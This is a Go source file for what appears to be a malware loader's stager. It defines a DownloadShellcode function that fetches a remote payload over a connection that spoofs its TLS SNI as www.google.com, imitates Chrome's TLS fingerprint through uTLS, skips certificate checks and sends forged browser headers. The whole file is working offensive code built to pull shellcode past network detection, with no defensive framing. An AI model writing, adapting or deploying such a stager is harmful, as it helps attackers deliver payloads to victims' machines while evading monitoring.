package nopoe

import (
	"fmt"
	"io"
	"net"
	"net/url"
	"strings"
	"time"

	utls "github.com/refraction-networking/utls"
)

// fetchPayload handles downloading a payload from a given URL,
// automatically detecting whether to use HTTP or HTTPS (with uTLS).
func fetchPayload(targetURL string) ([]byte, error) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %v", err)
	}

	host := parsedURL.Host
	// Ensure port is added if not present for standard schemes
	addr := parsedURL.Host
	if !strings.Contains(addr, ":") {
		if parsedURL.Scheme == "https" {
			addr = net.JoinHostPort(host, "443")
		} else {
			addr = net.JoinHostPort(host, "80")
		}
	}


	var conn net.Conn
	
	// Choose connection method based on URL scheme
	if parsedURL.Scheme == "https" {
		
		serverName := "www.google.com" // SNI Spoofing for HTTPS

		// Establish a TCP connection
		tcpConn, err := net.DialTimeout("tcp", addr, 10*time.Second)
		if err != nil {
			return nil, fmt.Errorf("failed to connect to host (TCP): %v", err)
		}

		// Configure and perform uTLS handshake
		config := &utls.Config{
			ServerName:         serverName,
			InsecureSkipVerify: true,
		}
		uconn := utls.UClient(tcpConn, config, utls.HelloChrome_Auto)
		if err := uconn.Handshake(); err != nil {
			return nil, fmt.Errorf("uTLS handshake failed: %v", err)
		}
		conn = uconn // Promote uTLS connection to the generic net.Conn
	} else {
		// For plain HTTP, just establish a standard TCP connection
		tcpConn, err := net.DialTimeout("tcp", addr, 10*time.Second)
		if err != nil {
			return nil, fmt.Errorf("failed to connect to host (TCP): %v", err)
		}
		conn = tcpConn
	}
	defer conn.Close()

	// Construct the HTTP request with spoofed headers
	request := fmt.Sprintf("GET %s HTTP/1.1\r\n", parsedURL.RequestURI())
	request += fmt.Sprintf("Host: %s\r\n", host) // The actual host header
	request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\r\n"
	request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n"
	request += "Accept-Language: en-US,en;q=0.9\r\n"
	request += "Connection: close\r\n\r\n"
	
	// Send the request over the established connection (either TCP or uTLS)
	_, err = conn.Write([]byte(request))
	if err != nil {
		return nil, fmt.Errorf("failed to send HTTP request: %v", err)
	}

	// Read the response
	response, err := io.ReadAll(conn)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %v", err)
	}

	// Basic HTTP response parsing to get the body
	parts := strings.SplitN(string(response), "\r\n\r\n", 2)
	if len(parts) < 2 {
		return nil, fmt.Errorf("invalid or empty HTTP response")
	}

	return []byte(parts[1]), nil
}

// DownloadShellcode is the public function that will be called from main.go
func DownloadShellcode(url string) ([]byte, error) {
	return fetchPayload(url)
}

// CheckConnectivity is deprecated but kept for compatibility.
func CheckConnectivity(url string) bool {
	_, err := fetchPayload(url)
	return err == nil
}
